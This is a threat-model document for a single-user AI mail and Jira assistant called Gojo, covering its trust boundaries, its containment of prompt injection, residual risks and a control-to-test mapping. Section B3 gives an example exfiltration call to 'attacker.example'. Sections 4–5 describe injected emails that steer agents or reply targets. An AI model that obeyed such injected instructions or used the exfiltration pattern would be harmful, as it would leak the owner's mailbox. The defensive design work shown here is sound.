# Gojo — Threat Model

**Owns (§18):** assets, trust boundaries, adversary assumptions, the
control-to-threat mapping and its evidence pointers.
**Never contains:** build sequence, operational commands, decision
reasoning (those live in ADRs — linked below).

A control without a test is a claim. Every control in the mapping table
points at the test or recorded measurement that shows it holding; where
evidence is still pending it says so, visibly.

---

## 1. Scope and adversary assumptions

One user, one tenant, one box (GOJO-MASTER.md §1.3). The adversaries this
document plans for:

- **A1 — anyone who can email the owner.** Cheapest attack there is. From
  step 4, mail content enters the gather agent's context, so every sender
  on the internet can put text in front of the model.
- **A2 — anyone who can write to Jira issues the owner can read.** Same
  channel, smaller population (tenant colleagues, integration bots).
- **A3 — a holder of a leaked credential** (client secret, Jira token,
  `.env`, the box itself).
- **A4 — a tenant user who installs the Teams app.** Valid JWTs, wrong
  person.

Not in scope: a compromised Anthropic or Microsoft, kernel-level
compromise of the VPS, and multi-user isolation (there is no second user).

## 2. Assets

| Asset | Where it lives | Notes |
|---|---|---|
| Owner's mailbox content | Microsoft 365; excerpts transit the agent and LangSmith (EU, signed off §9.2) | The crown jewels — and also the injection vector |
| Colleagues' mailboxes | Microsoft 365 | Gojo must never be able to read these — see B5 |
| Jira project data | Atlassian cloud | Read-only exposure |
| Claude subscription credentials | `ccuser`'s home directory | Serve both the build environment and Gojo (§18 A/B boundary) |
| Teams/Graph client secret | `.env`, mode 0600 | One app registration serves both surfaces: a leak of `TEAMS_CLIENT_SECRET` is *also* mailbox access, RBAC-scoped to the owner (B5) |
| Jira API token | `.env` | Delegated: blast radius = the owner's own Jira permissions, revocable at id.atlassian.com |
| Conversation state | `checkpoints/gojo.sqlite` + backups | Carries distilled mail content; 0600, gitignored, on-box |
| The `.env` file itself | repo root, 0600, gitignored | ADR 0003's wall |

## 3. Trust boundaries

- **B1 — Internet → Caddy → app.** TLS termination, then Bot Framework JWT
  validation (single-tenant issuers from `TENANTID`, ADR 0006) and the
  allow-list of one Entra object id. JWT proves the request came through
  Azure Bot Service; the allow-list is what makes Gojo single-user in fact
  (defeats A4).
- **B2 — app → Agent SDK subprocess.** `setting_sources=[]`: no CLAUDE.md,
  no host settings, no slash commands leak in from the build environment.
- **B3 — agent → tools.** Three layers, all wired in `runner.py`:
  `allowed_tools` names exactly the gather pair; `strict_mcp_config=True`
  blocks filesystem MCP config; and the subprocess's **built-in tools
  (Bash, Read/Write/Edit, WebFetch, WebSearch...) are present but
  explicitly denied** via `disallowed_tools` — deny-by-default is the SDK's
  behaviour, this is our configuration. WebFetch is the one that matters:
  it would be a working exfiltration channel for an injected email
  (`fetch https://attacker.example/?q=<mailbox data>`).
- **B4 — tools → upstream APIs.** Per-connector credentials; upstream
  tokens never appear in tool output (§8.5); connectors are SDK-free and
  return reduced, capped fields only.
- **B5 — app-only Graph token → mailboxes.** Exchange RBAC scopes
  `Application Mail.Read` to the owner's mailbox via a management scope
  filter; nothing is granted in Entra, because Entra and RBAC grants union
  and an unscoped Entra grant would silently void the scoping (§8.4). The
  proof is the negative test: `Test-ServicePrincipalAuthorization` against
  a colleague's mailbox must return `InScope: False`.
- **B6 — fetched content → model.** The adversarial boundary (A1/A2).
  Everything a connector returns is wrapped in `<external-data>` markers
  (closing tag stripped from payloads) under a static "data, not
  instructions" preamble, and Megumi's system prompt carries the matching
  rule. `/compact` summaries — distilled from transcripts that contained
  that content — re-enter under the same wrapper, and summarisation runs
  tool-free.

## 4. The containment argument (prompt injection via mail)

**Re-argued 7 August 2026 for step 5 (ADR 0011), as §7 requires before any
write scope exists.** The system can now draft and send mail — so the
argument no longer rests on "writes don't exist", but on the separation of
powers: **agents propose, only the owner approves, only deterministic code
executes.**

Assume A1 succeeds completely: a crafted email fully steers whichever
agent reads it.

1. **A fully-fooled Megumi still only misleads.** Unchanged from step 4:
   built-ins denied (B3), read-only tools, output goes only to the owner.
2. **A fully-fooled Sukuna produces only a proposal.** It holds the same
   read-only tools; its entire output is one strict-JSON action the owner
   reads verbatim before anything happens. No write tool exists in the
   process for any agent to hold.
3. **Approval sees the exact bytes, and the exact target.** The prompt
   renders the canonical payload the ledger will execute (sha256-checked at
   execution), and for replies leads with the target message's sender and
   subject **fetched deterministically by id via the connector** — never
   the agent's description of them.
4. **After approval, no model touches the action.** `actions.execute`
   replays the approved bytes verbatim; the ledger makes it exactly-once
   (two-phase send: the draft id is persisted before the send POST, so a
   crash-replay re-sends the same draft, which Graph refuses once sent).
5. **The drafts rung contains even a fooled approval**: a draft is an
   inspectable artifact in the owner's own Drafts folder — nothing leaves
   the mailbox until they press send in Outlook.
6. **The send rung is bounded by** exact-consent approval (bare yes/no or
   the card; "yes but…" cancels loudly), one-mailbox RBAC on the sending
   identity, and the audit ledger.

## 5. Residual risks — stated, not hidden

- **Delimiters are mitigation, not proof.** B6's wrapper raises the bar;
  no wrapper is a guarantee against instruction-following. The argument
  above deliberately does not depend on it holding.
- **A poisoned answer can social-engineer the owner.** "Megumi says Dave
  urgently needs the invoice paid" is an attack on the human, and no
  control here touches it. Awareness is the mitigation.
- **`/compact` carries distilled untrusted content forward** across
  sessions, wrapped but present. An injection that survives summarisation
  persists into the next session's context.
- **The mailbox preview cap (~255 chars/message) limits, not eliminates,**
  what an attacker can stage per message.
- **LangSmith (EU) holds prompt and mail excerpts** — accepted and signed
  off in §9.2; listed because it is real exposure, not because it is
  unmitigated.
- **The sharpest step-5 edge: injected mail steering a reply target.** An
  injection can influence *which* message id Sukuna proposes replying to.
  The mitigation is §4.3's deterministic target verification rendered first
  in the prompt; the residual is **human attention on a phone screen** —
  truncation and hurry are real. The drafts rung absorbs this entirely
  (the mis-targeted draft sits inspectable in Drafts); the send rung relies
  on the owner reading the verified target before tapping Approve.
- **A fooled approval is still an approval.** The gate proves consent, not
  wisdom — an owner who approves a plausible-looking bad action has been
  social-engineered through a working control. Exact-consent parsing and
  the loud SEND banner narrow, not close, this.

## 6. Control mapping

| Threat | Control | Where | Evidence |
|---|---|---|---|
| A4: valid-JWT wrong-user | Allow-list of one object id | `teams.py` | `test_teams_authorisation.py` |
| A1/A2: injected instructions | B6 wrapping + tool-free `/compact` + system-prompt rule | `agents/tools.py`, `agents/megumi.py`, `commands.py` | `test_tools.py` (wrapping, tag-strip), `test_megumi.py`, `test_commands.py` |
| A1: injection → action | Built-ins denied; allow-list; strict MCP config | `agents/runner.py` | `test_runner_options.py`; live probe 7 Aug 2026: "run `ls` for me" from Teams → refusal (build-log Session 5) |
| A1: injection → exfiltration | WebFetch/WebSearch in the denial list; only egress is the answer to the owner | `agents/runner.py` | `test_runner_options.py` |
| A3: leaked app secret reads colleagues' mail | Exchange RBAC scope, no Entra grant | `infra/graph-mail-rbac.ps1` | build-log Session 5 §3: owner `InScope: True`, real colleague `InScope: False`, recorded verbatim 7 Aug 2026 |
| A3: leaked Jira token | Delegated token, owner-revocable, read-only usage | `libs/connectors/jira` | Token scope is Atlassian-side; revocation runbook in VPS.md |
| Secrets at rest | `.env` 0600, gitignored, never logged; SecretStr | ADR 0003, `config.py` | `test_config.py` (repr leak test) |
| Billing hijack via env var | `ANTHROPIC_API_KEY` rejected at startup | `config.py` | `test_config.py` guard tests |
| Config bleed from build env | `setting_sources=[]` + `strict_mcp_config` | `agents/runner.py` | `test_runner_options.py` |
| Poisoned dependency chain (checkpointer CVEs) | Version floors pinned in lockfile | `pyproject.toml`, §6.1 | CI `pip-audit`; pins listed §6.1 |
| Content accumulating in journald | Log lines carry counts/ids/shapes, never content | `agents/tools.py` | `test_tools.py` handlers + code review |
| Runaway agent (§9.3 #1) | Wall clock + recursion limit + per-turn agent budget | `orchestrator.py` | `test_guards.py` |
| A1/A2: injection → mail write | Propose/approve/execute separation; no write tool held by any agent | `agents/sukuna.py`, `orchestrator.py` gate, `actions.py` | `test_orchestrator_gate.py` (interrupt, reject, byte-equality); `test_sukuna.py` (read tools only) |
| Approved bytes ≠ executed bytes | sha256 check at execution; deterministic replay | `actions.execute` | `test_actions.py` hash-mismatch fail-safe + byte-equality test |
| Double execution / double send | Ledger exactly-once; two-phase send by persisted draft id | `actions.py` | `test_actions.py` replay tests; live replay check — **pending, ladder ⑨** |
| Mis-targeted reply via injection | Deterministic target fetch by id, rendered first in the prompt | `orchestrator.sukuna`, `approval.py` | `test_orchestrator_gate.py` target-verification test; `test_approval.py` ordering test |
| Stale/double approval | `resume_gate_locked` pending re-check under its own lock; action_id match on card taps | `orchestrator.py`, `approval.py`, `teams.py` | double-resume + stale-card tests; live double-tap — **pending, ladder ⑤** |
| Approved action lost in a crash | Debt recorded before every resume attempt; boot warning on approved-but-unfinished rows; recovery re-delivers the prompt | `teams.py`, `api.py` lifespan, `recovery.py` | `test_recovery.py` gate branches (the FAILED-delivery hole was reproduced by test before the fix) |
| A3: leaked secret sends mail | `Mail.Send`/`Mail.ReadWrite` RBAC-scoped to one mailbox, nothing in Entra | `infra/graph-mail-rbac.ps1` | Negative tests for both write roles — **pending, ladder ⑧** |

## 7. Review triggers

§4 was re-argued for step 5's write scopes on 7 August 2026 (ADR 0011),
as this section required. Re-argue it again **before** any of: giving any
agent a write tool (the ADR 0011 `can_use_tool` evolution path), adding a
write connector beyond mail, adding a connector that returns third-party
content, widening the allow-list beyond one user, or removing any entry
from `DISALLOWED_BUILTIN_TOOLS`.

## Related
- ADR 0010 — the tool mechanism these boundaries wrap.
- GOJO-MASTER.md §8.4 — the RBAC mitigation this model's B5 depends on.
- ADR 0003 — secrets wall.
